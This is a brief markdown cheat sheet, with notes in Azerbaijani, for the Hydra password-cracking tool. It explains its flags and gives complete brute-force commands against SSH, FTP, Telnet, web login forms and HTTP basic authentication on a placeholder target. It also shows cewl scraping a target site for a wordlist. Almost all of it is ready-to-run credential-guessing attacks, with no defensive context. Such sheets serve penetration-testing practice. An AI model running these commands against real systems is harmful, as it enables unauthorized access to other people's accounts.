# Hydra

```
-t ( Thread )
-w ( Wait )
-s ( Port )
-L / -P ( İstifadəçi və parol siyahısı )
-vV ( Verbose )
-e ns ( "null" və "same" (istifadəçi adı ilə eyni parol) yoxlaması )
-l <user>: ( Tək istifadəçi adı )
-p <pass>: ( Tək parol )
-f İlk tapılan parolda dayan (exit).


hydra -L users.txt -P passwords.txt -t 4 ssh://<target_ip>
hydra -L users.txt -P passwords.txt ftp://<target_ip>
hydra -L users.txt -P passwords.txt telnet://<target_ip>

# HTTP (Form-based Login)
hydra -L users.txt -P passwords.txt <target_ip> http-form-post "/login.php:user=^USER^&pass=^PASS^:Invalid username or password"

# HTTP Basic Authentication
hydra -L users.txt -P passwords.txt <target_ip> http-get /admin/


cewl -w target_words.txt http://<target_url>
hydra -L target_words.txt -P passwords.txt ssh://<target_ip>
```
